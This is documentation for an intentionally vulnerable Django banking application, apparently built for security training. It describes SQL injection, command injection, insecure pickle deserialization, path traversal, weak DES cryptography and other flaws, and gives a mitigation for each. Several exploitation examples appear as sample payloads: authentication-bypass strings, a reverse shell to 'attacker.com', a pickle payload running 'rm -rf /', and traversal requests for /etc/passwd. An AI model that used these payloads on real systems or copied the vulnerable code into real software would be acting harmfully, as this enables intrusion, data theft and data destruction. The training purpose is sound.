# Security Vulnerabilities

## Overview

This application contains intentional security vulnerabilities designed for educational purposes, security testing, and vulnerability assessment training. These vulnerabilities should never be present in production applications.

## Critical Vulnerabilities

### 1. SQL Injection

#### Description

The application uses raw SQL queries with string concatenation, allowing attackers to inject malicious SQL code.

#### Location

Multiple locations in `src/web/services.py`:

```python
# AccountService
sql = "select * from web_account where username='" + username + "' AND password='" + password + "'"

# CashAccountService
sql = "select * from web_cashaccount where username='" + username + "'"

# ActivityService
sql = "SELECT * FROM web_transaction WHERE number = '" + number + "'"
```

#### Exploitation Example

```python
# Bypass authentication
username = "admin' OR '1'='1"
password = "anything"
# Results in: SELECT * FROM web_account WHERE username='admin' OR '1'='1' AND password='anything'

# Extract all users
username = "' OR 1=1 --"
# Results in: SELECT * FROM web_account WHERE username='' OR 1=1 --'
```

#### Impact

- Authentication bypass
- Data extraction
- Data modification
- Database compromise
- Privilege escalation

#### Mitigation

Use parameterized queries or Django ORM:

```python
# Correct approach
Account.objects.filter(username=username, password=password)

# Or with parameterized raw SQL
cursor.execute("SELECT * FROM web_account WHERE username=%s AND password=%s", [username, password])
```

### 2. Command Injection

#### Description

The application executes system commands with unsanitized user input.

#### Location

`src/web/views.py`:

```python
def to_traces(string: str) -> str:
    return str(os.system(string))

# Usage in TransferView
to_traces(f"echo {transfer.fromAccount} to account {transfer.toAccount} accountType:{account_type}>traces.txt")
```

#### Exploitation Example

```python
# Execute arbitrary commands
fromAccount = "123456; cat /etc/passwd"
# Results in: echo 123456; cat /etc/passwd to account ...

# Reverse shell
fromAccount = "123456; nc attacker.com 4444 -e /bin/bash"
```

#### Impact

- Remote code execution
- Server compromise
- Data exfiltration
- Service disruption

#### Mitigation

- Never use `os.system()` with user input
- Use subprocess with argument list
- Sanitize and validate all inputs
- Use allowlists for acceptable values

```python
# Correct approach
import subprocess
subprocess.run(["echo", transfer.fromAccount], check=True)
```

### 3. Insecure Deserialization

#### Description

The application uses Python's `pickle` module to serialize and deserialize objects, which can execute arbitrary code.

#### Location

`src/web/views.py`:

```python
class Untrusted(Trusted):
    def __reduce__(self):
        return os.system, ("ls -lah",)

# Certificate download
certificate = pickle.dumps(Untrusted("this is not safe"))

# Certificate upload
pickle.loads(data)  # Executes arbitrary code
```

#### Exploitation Example

```python
import pickle
import os

class Exploit:
    def __reduce__(self):
        return os.system, ("rm -rf /",)

# Create malicious pickle
malicious = pickle.dumps(Exploit())

# When unpickled, it executes the command
pickle.loads(malicious)  # Deletes all files
```

#### Impact

- Remote code execution
- System compromise
- Data loss
- Service disruption

#### Mitigation

- Never unpickle untrusted data
- Use JSON or other safe serialization formats
- Implement signature verification
- Restrict pickle usage to trusted contexts

```python
# Correct approach
import json
data = json.dumps({"username": "john"})
obj = json.loads(data)
```

### 4. Path Traversal

#### Description

The application allows file access without proper validation, enabling access to arbitrary files.

#### Location

`src/web/views.py`:

```python
# AvatarView
image = request.GET.get("image")
file = image if storage_service.exists(image) else "avatar.png"
return HttpResponse(storage_service.load(file), content_type="image/png")

# CreditCardImageView
image = request.GET.get("url")
filename, file_extension = os.path.splitext(image)
name = filename + file_extension
with open(os.path.join(resources, name), "rb") as fh:
    data = fh.read()
```

#### Exploitation Example

```bash
# Access /etc/passwd
GET /dashboard/userDetail/avatar?image=../../../../etc/passwd

# Access sensitive files
GET /dashboard/userDetail/creditCardImage?url=../../../../src/config/settings.py
```

#### Impact

- Information disclosure
- Access to sensitive files
- Configuration file exposure
- Source code disclosure

#### Mitigation

```python
# Correct approach
import os
from pathlib import Path

def safe_join(base_dir, user_path):
    base = Path(base_dir).resolve()
    full_path = (base / user_path).resolve()

    # Ensure path is within base directory
    if not str(full_path).startswith(str(base)):
        raise ValueError("Path traversal detected")

    return full_path
```

### 5. Weak Cryptography

#### Description

The application uses weak DES encryption with static keys.

#### Location

`src/web/views.py`:

```python
secretKey = bytes("01234567", "UTF-8")

def get_file_checksum(data: bytes) -> str:
    (dk, iv) = (secretKey, secretKey)
    crypter = DES.new(dk, DES.MODE_CBC, iv)
    padded = pad(data, DES.block_size)
    encrypted = crypter.encrypt(padded)
    return base64.b64encode(encrypted).decode("UTF-8")
```

#### Issues

- DES is cryptographically broken
- Static key hardcoded in source
- IV same as key
- Not a proper checksum/hash function

#### Impact

- Data can be decrypted
- Integrity verification bypassed
- Man-in-the-middle attacks

#### Mitigation

```python
# Correct approach
import hashlib
import hmac
import secrets

# For checksums/integrity
def calculate_checksum(data: bytes) -> str:
    return hashlib.sha256(data).hexdigest()

# For encryption
from cryptography.fernet import Fernet
key = Fernet.generate_key()
cipher = Fernet(key)
encrypted = cipher.encrypt(data)
```

### 6. Plaintext Password Storage

#### Description

Passwords are stored in plaintext in the database.

#### Location

`src/web/models.py` and `src/web/services.py`:

```python
class Account(models.Model):
    password = models.CharField(max_length=80)  # Plaintext

# Authentication
sql = "select * from web_account where username='" + username + "' AND password='" + password + "'"
```

#### Impact

- Complete account compromise if database leaked
- Password reuse attacks
- Compliance violations

#### Mitigation

```python
# Correct approach
from django.contrib.auth.hashers import make_password, check_password

# Storing password
hashed = make_password(plain_password)

# Verifying password
is_valid = check_password(plain_password, hashed_password)
```

### 7. Missing Authentication Checks

#### Description

Some endpoints have insufficient authentication and authorization checks.

#### Location

`src/web/views.py`:

```python
# AdminView - no actual admin check
class AdminView(TemplateView):
    # Any authenticated user can access
    def get_context_data(self, *args, **kwargs):
        context["accounts"] = AccountService.find_all_users()
```

#### Impact

- Unauthorized data access
- Privilege escalation
- Information disclosure

#### Mitigation

```python
# Correct approach
from django.contrib.auth.mixins import UserPassesTestMixin

class AdminView(UserPassesTestMixin, TemplateView):
    def test_func(self):
        return self.request.user.is_superuser
```

### 8. Insecure Direct Object References

#### Description

Users can access other users' data by manipulating parameters.

#### Location

`src/web/views.py`:

```python
# ActivityView - no ownership verification
account_number = self.request.resolver_match.kwargs["account"]
first_cash_account_transfers = ActivityService.find_transactions_by_cash_account_number(account_number)
```

#### Exploitation Example

```bash
# Access another user's transactions
GET /activity/999999/detail
```

#### Impact

- Unauthorized data access
- Privacy violations
- Data theft

#### Mitigation

```python
# Correct approach
account_number = kwargs["account"]
cash_accounts = CashAccountService.find_cash_accounts_by_username(request.user.username)
account_numbers = [acc.number for acc in cash_accounts]

if account_number not in account_numbers:
    raise PermissionDenied("Access denied")
```

### 9. Cross-Site Request Forgery (CSRF)

#### Description

While Django provides CSRF protection, it can be bypassed or is not consistently enforced.

#### Location

Forms and POST endpoints throughout the application.

#### Impact

- Unauthorized actions performed
- Account compromise
- Data modification

#### Mitigation

```html
<!-- Correct approach -->
<form method="post">
    {% csrf_token %}
    <!-- form fields -->
</form>
```

### 10. Insufficient Input Validation

#### Description

User inputs are not properly validated or sanitized.

#### Location

Throughout the application, particularly in:

- File uploads (no type checking)
- Transfer amounts (no limits)
- Account numbers (no format validation)

#### Impact

- Various injection attacks
- Application errors
- Data corruption

#### Mitigation

```python
# Correct approach
from django.core.validators import validate_email, MinValueValidator, MaxValueValidator

class Transfer(models.Model):
    amount = models.DecimalField(
        max_digits=10,
        decimal_places=2,
        validators=[MinValueValidator(0.01), MaxValueValidator(10000)]
    )
```

## Vulnerability Testing

These vulnerabilities are tested in `tests/security/`:

- `test_sql_injection.py`
- `test_command_injection.py`
- `test_deserialization.py`
- `test_crypto_weaknesses.py`

## Security Testing Tools

Recommended tools for testing:

- **SQLMap**: SQL injection detection
- **Burp Suite**: Web vulnerability scanner
- **OWASP ZAP**: Security testing
- **Bandit**: Python security linter
- **Safety**: Dependency vulnerability scanner

## Intentional vs Accidental

All vulnerabilities in this application are **intentional** and serve educational purposes. In a real application, these would be critical security flaws requiring immediate remediation.

## Security Headers

The application is missing important security headers:

- Content-Security-Policy
- X-Frame-Options
- X-Content-Type-Options
- Strict-Transport-Security

## Related Documentation

- [Application Architecture](overview.md)
- [Services Layer](services.md)
- [Views and URL Routing](views-urls.md)
- [Security Tests](../testing/security-tests.md)
